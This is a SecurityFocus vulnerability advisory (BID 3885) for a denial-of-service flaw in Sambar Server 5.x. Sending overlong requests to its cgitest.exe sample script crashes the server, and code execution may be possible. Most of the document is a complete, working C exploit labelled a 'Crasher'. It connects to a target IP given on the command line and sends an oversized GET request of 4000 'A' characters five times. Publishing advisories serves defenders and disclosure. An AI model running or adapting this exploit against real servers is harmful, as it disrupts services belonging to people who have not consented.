source: http://www.securityfocus.com/bid/3885/info

Sambar Server is a multi-threaded web server which will run on Microsoft Windows 9x/ME/NT/2000 operating systems.

It is possible to cause a denial of service to Sambar Server by sending consecutive excessively long requests to the 'cgitest.exe' sample script.

The possibility exists that this issue may be the result of improper bounds checking. As a result, this vulnerability may potentially be used to execute arbitrary code on the host running the vulnerable software. Though this has not been confirmed.

While this issue was reported for Sambar Server 5.1, other versions may also be affected.

/*********************************************************************
**********
**
**               06.02.2002 - GREETZ TO WbC-BoArD & YAST CREW

**
**               Compiled with gcc under linux with kernel 2.4.17

**
**               Programname: Sambar Server 5.0  Manufacturer:Jalyn

**
**********************************************************************
*********/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define SERVER_PORT 80
#define MAX_MSG 100

  int sd, rc, i,j;
  char buf[5000];
  char msgtosnd[5024];
  char msgtoget[102400];
  char source[200000];
  struct sockaddr_in localAddr, servAddr;
  struct hostent *h;
  FILE *f1;

int main (int argc, char *argv[]) {
printf("Sleepy of Yast presents \"Sambar Server Production 5.0
Crasher\"\n");
if(argc != 2)
{
printf(">>> usage: %s <ip>",argv[0]);exit(0);
};
h = gethostbyname(argv[1]);
if(h==NULL)
{
printf("%s: unknown host '%s'\n",argv[0],argv[1]);
exit(1);
}
servAddr.sin_family = h->h_addrtype;
memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0],
h->h_length);
servAddr.sin_port = htons(SERVER_PORT);
sd = socket(AF_INET, SOCK_STREAM, 0);
if(sd<0)
{
perror("cannot open socket ");
exit(1);
}

localAddr.sin_family = AF_INET;
localAddr.sin_addr.s_addr = htonl(INADDR_ANY);
localAddr.sin_port = htons(0);
rc = bind(sd, (struct sockaddr *) &localAddr, sizeof(localAddr));

if(rc<0)
{
printf("%s: cannot bind port TCP %u\n",argv[0],SERVER_PORT);
perror("error ");
exit(1);
}
rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
if(rc<0)
{
perror("cannot connect ");
exit(1);
};
strcpy(buf,"A");
fprintf(stderr,"Entering Loop\n");
for(i=1;i<4000;i++)
{
strcat(buf,"A");
}
sprintf(msgtosnd,"GET /cgi-win/cgitest.exe?%s HTTP/1.1\nhost:
localhost\n\n\n",buf);
for(j=0;j<5;j++)
{
send(sd,msgtosnd,5024,0);
}
printf("\n\n BOOOOM");
}